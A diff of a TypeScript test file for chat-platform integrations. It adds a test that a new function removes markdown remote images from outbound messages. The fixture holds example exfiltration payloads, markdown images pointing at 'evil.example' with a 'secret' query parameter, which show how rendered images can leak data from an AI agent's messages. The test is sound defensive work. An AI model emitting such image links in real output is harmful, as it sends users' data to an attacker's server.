@@ -3,7 +3,7 @@
 import { describe, expect, it } from '@effect/vitest';
 import { Effect, Schema } from 'effect';
 import type { Json } from '../src/decl/values.ts';
-import { send_input_schema } from '../src/engine/integrations/outbound.ts';
+import { send_input_schema, without_remote_images } from '../src/engine/integrations/outbound.ts';
 import { conversationOf } from '../src/engine/integrations/instances.ts';
 import slack from '../src/system/integration/slack/+integration.ts';
 import telegram from '../src/system/integration/telegram/+integration.ts';
@@ -247,5 +247,16 @@ describe('sender handles (senders.ts)', () => {
 		expect(canonicalHandle('telegram', '@')).toBe('');
 		expect(canonicalHandle('phone', 'no digits')).toBe('');
 		expect(canonicalHandle(null, 'U1ABC')).toBe('u1abc'); // a conversation without handles still keys its rate limits
+	});
+});
+
+describe('an outbound message', () => {
+	it('carries no remote image a platform would fetch on render', () => {
+		expect(
+			without_remote_images('Done ![chart](https://evil.example/p?d=secret) and ![x](//evil.example/q)')
+		).toBe('Done chart and x');
+		expect(without_remote_images('see [the site](https://example.com)')).toBe(
+			'see [the site](https://example.com)'
+		);
 	});
 });
